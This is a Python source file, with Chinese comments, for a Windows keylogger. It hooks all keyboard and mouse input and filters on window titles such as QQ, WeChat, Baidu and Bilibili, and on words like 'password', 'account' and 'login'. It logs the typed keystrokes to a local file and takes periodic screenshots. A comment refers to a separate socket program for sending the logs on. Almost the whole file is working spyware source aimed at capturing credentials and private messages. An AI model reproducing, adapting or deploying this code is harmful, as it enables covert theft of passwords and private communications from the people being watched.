# -*- coding: utf-8 -*-
# -*- coding: gbk -*-

"""
author: 握着玫瑰的屠夫
done date: 2020.11.25
programing language: python
programing version: python3.78
contact: QQ<--2472674814-->  Email<--EternalNight996@gmail.com-->
describe: Monitor Keyboard and Mouse
current application version: 1.0
"""
import pythoncom
import PyHook3
import os
import time
import threading
import win32api
from PIL import ImageGrab
#------我们用关键词去筛选，软件会在什么时候去监听记录截屏, 想要监听什么窗口就在下面添加即可
lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux',
        'bilibili', 'baidu']
MSG=""
title_word=""
global_title=""
pathlist={'open_filename':'', 'open_pic_dir':'', 'dos_filename':'',
        'dos_pic_dir':'', 'dos_config':'', 'pic_msg':''}
countmouse=10

#hook鼠标监控函数
def onMouseEvent(event):
    global lists, MSG, global_title, pathlist, countmouse
    #引用基层API记录状态
    mouse_status=event.MessageName
    pic_msg=""
    #当鼠标左键和右键点击的时候回触发,下面截屏和键盘记录函数
    if mouse_status=="mouse left down" or mouse_status=="mouse right down":
        if global_title in lists:
            if MSG!="":
                countmouse+=1
                try:
                    getmore('txt', MSG).write_msg_to_txt()
                except:
                    t_init=threading.Thread(target=init_setting, name="init data son line")
                    t_init.start()
                    t_init.join()
                try:
                    #每次处罚到这里标准值就会+1，直到10时就会截屏！
                    if countmouse%3==0:
                        getmore('pic', MSG).get_local_image()
                        getmore('txt', pathlist['pic_msg']).write_msg_to_txt()
                        pathlist['pic_msg']=''
                        countmouse=0
                except:
                    os.makedirs(pathlist['dos_pic_dir'])
                win32api.PostQuitMessage()
            global_title=""
    return True

#hook键盘监控函数
def onKeyboardEvent(event):
    global lists, MSG, title_word, global_title, pathlist
    words,title='',''
    status, title_status, break_status=1,1,1
    #当前监控的的Ascii十进制数值
    keyid=event.Ascii
    #Ascii十进制32-127以内，部分是无法显示
    keychar=chr(event.Ascii)
    #Ascii明文，大部分都是依靠下面变量去判断
    keyword=event.Key
    #当前窗口如QQ或bilibili的名称
    title=event.WindowName
    #计算标题函数
    if title and len(title) >0:
        for n in range(len(lists)):
            if len(title) >=len(lists[n]):
                for tw in title:
                    words+=tw
                    if words ==lists[n]:
                        global_title=words
                        title_status=0
                        break_status=0
                        break
            if break_status==0:
                break
            words=''
    #下面函数则是键盘记录的核心，我已经绞尽脑汁了。
    if title_status==0:
        if (title_word!=title and keyword!="Lcontrol" and keyword!="Rcontrol"
            and keyword!="Lmenu" and keyword!="Rmenu" and keyword!="Capital"
            and keyword!="Lshift" and keyword!="Rshift"
            ):
            title_word=title
            MSG=getmore('txt',None).get_local_time()+title+"窗口: "
        if 127 > keyid >32:
            MSG+=keychar
        else:
            if keyword=="Return":
                MSG+="<回车>"
                status=0
            elif keyword=="Tab":
                MSG+="<水平制表>"
            elif keyword=="Back":
                MSG+="<退格>"
            elif keyword=="Delete":
                MSG+="<删除>"
            elif keyword=="Space":
                MSG+="<空格>"
    if status == 0:
        if MSG!="":
            #当触发如回车或者一些特殊按键时候则触发记录
            try:
                getmore('txt', MSG).write_msg_to_txt()
            except:
                t_init=threading.Thread(target=init_setting, name="init data son line")
                t_init.start()
                t_init.join()
            win32api.PostQuitMessage()
        title_word=""
        global_title=""
        kwords=""
    # 同鼠标事件监听函数的返回值
    return True

#一个算法class集合
class getmore:
    def __init__(self, keyword, msg):
        global pathlist
        self.keyword, self.msg, self.pathlist=keyword, msg, pathlist
    #获取本地时间函数
    def get_local_time(self):
        if self.keyword=='txt':
            return time.strftime('%Y-%m-%d_%H:%M: ', time.localtime(time.time()))
        elif self.keyword=='pic':
            return time.strftime('%Y-%m-%d_%Hh%Mm%Ss', time.localtime(time.time()))
        elif self.keyword=='second':
            return time.strftime('%S',time.localtime(time.time()))

    #获取截屏并生成当前时间格式存储本地
    def get_local_image(self):
        global pathlist
        pic_lists =os.listdir(self.pathlist['dos_pic_dir'])
        #检测客户端本地存储超过一百张则全部清空
        if len(pic_lists) >2000:
            for pl in pic_lists:
                fpath=self.pathlist['dos_pic_dir']+pl
                if os.path.isfile(fpath):
                    os.remove(fpath)
        pic=ImageGrab.grab()
        pic_name='mouse_%s.jpg' %getmore('pic',self.msg).get_local_time()
        pic_save_to='{}{}'.format(pathlist['open_pic_dir'],pic_name)
        pic.save('%s' %pic_save_to)
        pathlist['pic_msg']=pic_save_to

    #将监控到的消息写入本地
    def write_msg_to_txt(self):
        f=open(self.pathlist['open_filename'],'a')
        f.write(self.msg+'\x0A')
        f.close()

#初始化数据和生成输出文件以及目录，所以值都在这里面修改。
def init_setting():
    global pathlist
    #-------------建立目录和文件信息-----------------------------
    lhome=os.path.abspath('.')
    lhomelist=lhome.split('\\')
    #下面有两种格式，一种用pyopen去打开，一种则是dos格式。如果想要修改生成的目录名则修改关键词即可
    #如果修改了，相应socket传输程序也需要修改
    pathlist['dos_filename']=lhome+'\\QQdata\\Monitor_log.txt'
    pathlist['dos_pic_dir']=lhome+'\\QQdata\\xx11\\'
    for n in range(len(lhomelist)):
        pathlist['open_filename']+=lhomelist[n]+'/'
        pathlist['open_pic_dir']+=lhomelist[n]+'/'
    pathlist['open_filename']+='QQdata/Monitor_log.txt'
    pathlist['open_pic_dir']+='QQdata/xx11/'
    times=0
    while True:
        times+=1
        if os.path.exists(pathlist['dos_filename']) and os.path.exists(pathlist['dos_pic_dir']):
            break
        elif times >=5:
            pathlist['open_filename']='D:/QQdata/Monitor_log.txt'
            pathlist['open_pic_dir']='D:/QQdata/xx11/'
            pathlist['dos_filename']='D:\\QQdata\\Monitor_log.txt'
            pathlist['dos_pic_dir']='D:\\QQdata\\xx11\\'
            break
        if not os.path.exists(pathlist['dos_pic_dir']):
            os.makedirs(pathlist['dos_pic_dir'])
        if not os.path.exists(pathlist['dos_filename']):
            open(pathlist['open_filename'], 'w').close()

#主要的监控集
def runhook():
    global pathlist
    while True:
        # 创建一个“钩子”管理对象
        hm = PyHook3.HookManager()
        # 监听所有鼠标事件钩子
        hm.MouseAll = onMouseEvent
        hm.HookMouse()
        # 监听所有键盘事件钩子
        hm.KeyDown = onKeyboardEvent
        hm.HookKeyboard()
        # 进入循环，如不手动关闭，程序将一直处于监听状态
        pythoncom.PumpMessages()
def main():
    #初始化数据
    init_setting()
    #把主要的监控运行设置线程，以免出BUG直接断开
    t_hook=threading.Thread(target=runhook,name='hook father line')
    #开始线程
    t_hook.start()
    #join可以防止阻塞，造成系统卡顿
    t_hook.join()
if __name__ == "__main__":
    main()
